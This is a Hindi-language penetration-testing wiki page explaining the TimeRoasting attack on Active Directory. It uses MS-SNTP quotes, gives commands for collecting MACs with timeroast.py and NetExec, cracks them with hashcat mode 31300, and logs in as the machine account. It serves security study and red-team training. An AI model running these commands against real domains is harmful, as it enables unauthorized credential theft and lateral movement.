# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting legacy MS-SNTP authentication extension का दुरुपयोग करता है। MS-SNTP में, एक client ऐसा 68-byte request भेज सकता है जिसमें किसी भी computer account RID को embed किया गया हो; domain controller response पर MAC compute करने के लिए computer account के NTLM hash (MD4) को key के रूप में उपयोग करता है और उसे वापस भेजता है।<sup>[[1]](#references)</sup> Attackers इन MS-SNTP MACs को बिना authentication के collect कर सकते हैं और उन्हें offline crack कर सकते हैं (Hashcat mode 31300), जिससे computer account passwords recover किए जा सकते हैं।<sup>[[2]](#references)</sup>

विवरण के लिए official MS-SNTP spec में section 3.1.5.1 "Authentication Request Behavior" और 4 "Protocol Examples" देखें।<sup>[[1]](#references)</sup>
![TimeRoasting: विवरण के लिए official MS-SNTP spec में section 3.1.5.1 "Authentication Request Behavior" और 4 "Protocol Examples" देखें](../../images/Pasted%20image%2020250709114508.png)
जब ExtendedAuthenticatorSupported ADM element false होता है, तो client एक 68-byte request भेजता है और authenticator के Key Identifier subfield के least significant 31 bits में RID embed करता है।<sup>[[1]](#references)</sup>

> यदि ExtendedAuthenticatorSupported ADM element false है, तो client MUST एक Client NTP Request message construct करना होगा। Client NTP Request message की length 68 bytes है। Client, section 2.2.1 में वर्णित तरीके से Client NTP Request message का Authenticator field set करता है, जिसमें RID value के least significant 31 bits को authenticator के Key Identifier subfield के least significant 31 bits में लिखता है, और फिर Key Selector value को Key Identifier subfield के most significant bit में लिखता है।<sup>[[1]](#references)</sup>

Section 4 (Protocol Examples) से:

> Request प्राप्त करने के बाद, server verify करता है कि received message size 68 bytes है। यह मानते हुए कि received message size 68 bytes है, server received message से RID extract करता है। Server इसका उपयोग NetrLogonComputeServerDigest method (जिसे [MS-NRPC] section 3.5.4.8.2 में specified किया गया है) को call करने के लिए करता है, ताकि crypto-checksums compute किए जा सकें और received message के Key Identifier subfield के most significant bit के आधार पर crypto-checksum select किया जा सके, जैसा कि section 3.2.5 में specified है। इसके बाद server client को response भेजता है, जिसमें Key Identifier field को 0 और Crypto-Checksum field को computed crypto-checksum पर set किया जाता है।<sup>[[1]](#references)</sup>

Crypto-checksum MD5-based है (देखें 3.2.5.1.1) और इसे offline crack किया जा सकता है, जिससे roasting attack संभव होता है।<sup>[[1]](#references)</sup>

## Attack कैसे करें

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Tom Tervoort द्वारा Timeroasting scripts<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Practical attack (unauth) with NetExec + Hashcat

- NetExec unauthenticated तरीके से computer RIDs के लिए MS-SNTP MACs enumerate और collect कर सकता है तथा cracking के लिए तैयार $sntp-ms$ hashes print कर सकता है:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Hashcat mode 31300 (MS-SNTP MAC) के साथ offline crack करें:<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- recovered cleartext एक computer account password से संबंधित है। जब NTLM disabled हो, तो इसे सीधे Kerberos (-k) का उपयोग करके machine account के रूप में आज़माएँ:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
संचालन संबंधी सुझाव
- Kerberos से पहले accurate time sync सुनिश्चित करें: `sudo ntpdate <dc_fqdn>`
- आवश्यकता होने पर AD realm के लिए krb5.conf generate करें: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- कोई authenticated foothold मिलने के बाद LDAP/BloodHound के माध्यम से RIDs को principals से map करें।

## संदर्भ

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – official docs](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
